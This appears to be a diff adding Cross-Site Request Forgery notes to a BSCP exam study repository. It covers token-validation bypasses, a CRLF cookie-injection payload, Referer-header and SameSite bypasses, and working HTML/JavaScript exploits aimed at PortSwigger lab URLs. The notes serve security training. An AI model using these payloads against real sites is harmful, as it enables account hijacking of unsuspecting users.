@@ -1,4 +1,4 @@
-# BSCP---Notes
+![image](https://github.com/user-attachments/assets/82af2472-43b9-4dff-ac39-a2f4730a4c40)![image](https://github.com/user-attachments/assets/c743d1c7-9c65-4594-822f-c80563b7fe06)![image](https://github.com/user-attachments/assets/293f69f4-e24e-46bd-a650-14f72c4a7d78)![image](https://github.com/user-attachments/assets/2672366f-e8a7-4dcc-b708-016ee2d1e0e0)# BSCP---Notes
 Notes and Additional Payloads for Web Application Vulnerabilities Topics covered in PortSwigger Academy
 
 *This is just another Notes Repo for the BSCP Exam. I hope you will find it helpful. For some topics, I have additional payloads and notes that go beyond the BSCP Exam, but I decided to include them if someone is interested.*
@@ -711,8 +711,105 @@ _Example_ --> Imagine a website where access controls are correctly applied to t
 **10)** Application can have very strict access control over sensitive endpoints such as /admin but if the application is relying only on ```Referrer Header``` for its subpages such as /```admin/deleteUser``` we can trick the application since Referrer Header is **user-controllable** input and set it to /admin for example as the back-end will assume that the Request is coming from /admin endpoint meaning that we are authorized user when we are actually not.
 
 
+# Cross-Site Request Forgery
+
+CSRF (Cross-Site Request Forgery) is a web security vulnerability where an attacker tricks a user into performing unintended actions on a web application where they are authenticated.
+
+## Exploitation
+
+**1)** Some applications will properly validate CSRF token within POST Request while failing to do so with a GET request, so by changing the Request Method from GET -> POST we may bypass CSRF token validation ( don't forget to delete csrf parameter in GET request)
+
+**2)** Some applications correctly evaluate the token if the token is present while failing to do so if we completely omit the token, resulting in bypassing CSRF protection
+
+**3)** If the application doesn't tie CSRF token with the session token of the user, rather just checks if the generated token is **in the pool of generated CSRF tokens** by the application we can conduct CSRF attack. First, with the account, we control start by initiating the request that will contain (generate) a CSRF token and then drop it, next generate PoC with Burp and include CSRF token from earlier, deliver the link to the victim and pull off CSRF.
+
+**4)** Some applications duplicate CSRF token value in Cookie Header and in the request for enchased security. However, if not properly configured this security mechanism can pose a security risk. First to test this type of protection try to replace CSRF original token value in both the Cookie Header and Request body with a custom created one. If the application accepts our CSRF token value where CSRF Token in the Body of the Request and in the Header is the same, we can proceed further with this type of an attack. Now, since we can't control HTTP Headers as we can parameters that are being sent within the Request, this is not very common technqiue. However, PortSwigger has one lab about it, consider following scenario: _There is a search functionality where user's last search will be stored in the Cookie Header as LastSearmTerm={}_
+
+**4.1)** Since we have control over the input of the Search function which accepts the GET Parameter and last search term will be appended to the Cookie Header as LastSearchTerm, we can **overwrite the csrf Cookie value as well that is used as CSRF Protection Mechanism**
+
+**4.2)** Since the goal of the lab is to change user's email address, first **generate** CSRF PoC with Burp for
+
+**4.3)** Then enumerate vulnerable search functionality and realize that there is no CSRF protection for it, which means we can send following GET Request to set the Cookie value for a user --> ```/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None``` which results in -->
+
+```	
+ /?search=test
+Set-Cookie: csrf=fake; SameSite=None!
+```
+
+**4.4)** With this in mind we can replace JavaScript code in generated PoC with the following code that will first set the cookie value for the user and then using the same value submit the form on behalf of the target user
+
+	### In this case we are setting CSRF token value to fake in Burp CSRF Poc and in the Cookie Header ###
+ 
+ ```<img src="https://<LAB_ID>.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>!```
 
 
+### Exploitation of Referre-Header CSRF Protection
+
+HTTP Referrer-Header attempts to protect the app from CSRF attacks by verifying that the request is coming from the application own's domain
+
+
+**1)**  Some applications will validate **Referrer Header** only if **it's present** if not app will **overlook** it. We can construct the CSRF payload and host it on the exploit server **plus we can add meta tag** that will make an **app drop Referrer Header**:
+
+```<meta name="referrer" content="no-referrer">``` ---> add this to <head></head> tags into the payload that we generated with Burp
+
+**2)** Some applications check the Referrer Header in a naïve way:
+
+**2.1)** Checking if the Referrer Header starts with the expected value, which can be bypassed like this: ```http://vulnerable-website.com.attacker-website.com/csrf-attack```
+
+**2.2)** Checking if the Referrer Header contains app's own domain name, which can be bypassed like this: ```http://attacker-website.com/csrf-attack?vulnerable-website.com```
+	When we are dealing with this bypass make sure to add the following code for JavaScript:
+	    ```history.pushState("", "", "/?0add00400447d233834a196100570078.web-security-academy.net")```
+	-Also add this in the Head section in the exploit server: ```Referrer-Policy: unsafe-url```
+
+###  SameSite Cookie Restriction Bypass
+
+SameSite is a browser security mechanism that can detect if the cookies of a website are included in the requests originating from other websites. Meaning that if we are storing our **CSRF PoC generated by Burp** on the Exploit Server goal of **SameSite** is to prevent that reqeust as it's coming from the differenr origin that than the target website is.
+
+
+**1)** Lax SameSite mechanism is being used by default by browsers. The Lax mechanism will only send cookies in cross-site requests when the request uses GET Method, which is really important for us in order to pull off CSRF attack.
+-We can test this by changing the POST request to GET in Burp and appending __method=POST_ within the url as such: 
+		```GET /my-account/change-email?email=wiener%40ubnormal-user.net&_method=POST ```
+	_ _method will force browser to use defined regest type (e.g. POST) rather than the one initially indicated (e.g. GET)_
+	-If the above works we can construct the exploit and store it on the exploit server as JavaScript code:
+ ```
+	<script>
+	    document.location = 'https://<LAB_URL>.web-security-academy.net/my-account/change-email?email=hijacked@email.com&_method=POST';
+	</script>
+```
+
+**2)** If we are dealing with the SameSite=Strict attribute we have to know that in this case browser won't include any cross-site requests. We can work around this one by finding a gadget resulting in a secondary request within a website. That's why because this secondary request will contain the cookie since it's coming from the same website. _Consider Following Scenario:_
+
+	-after we submitted the comment we observed Burp and we found an interesting endpoint --> /post/comment/confirmation?postId=x
+	-After the enumeration of response we found JS code that takes postId paramatar to dynamically construct the URL
+	-With that in mind since this is user-controllable input we can build a malicious script as: 
+	### we are here leveraging that secondary request because it's coming from the same website and it contains cookie already.
+ ```
+	<script>
+	    document.location = "https://<LAB_ID>.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=hacked%40email.com%26submit=1";
+	</script>
+```
+
+_notice how we are leveraging endpoint that is coming from website itself + includes the Cookie in order to reach /change email endpoint_
+
+
+**3)** So far we know that **LAX Mechanism** doesn't allow cookies to be sent over POST Request but there are some exceptions such as SSO, and LAX in that case doesn't enforce it for 120 seconds. So if we can find a way in the website where new session tokens are issued we can leverage that to pull of the attack. Here is the code:
+```
+	<form method="POST" action="https://<LAB_ID>.web-security-academy.net/my-account/change-email">
+	    <input type="hidden" name="email" value="hijack@email.com">
+	</form>
+	<p>Click anywhere on the page</p>
+	<script>
+	    window.onclick = () => {
+	        window.open('https://<LAB_ID>.web-security-academy.net/social-login');
+	        setTimeout(changeEmail, 5000);
+	    }
+	
+	    function changeEmail() {
+	        document.forms[0].submit();
+	    }
+</script>
+```
+**Explanation** --> goal is to change the email of the user, and there is a OAuth SSO in the app, and token for that is being changed every time when user visits social-login endpoint, now idea here is when user clicks our malicious link new tab opens targeting /social-login where new cookie will be generated for victim that we can use to pull off CSRF. This won't work because browser will prevent pop-ups. So we added additional JS Code which will be triggered after user clicks anywhere on the page and CSRF is pulled of
 
 
 
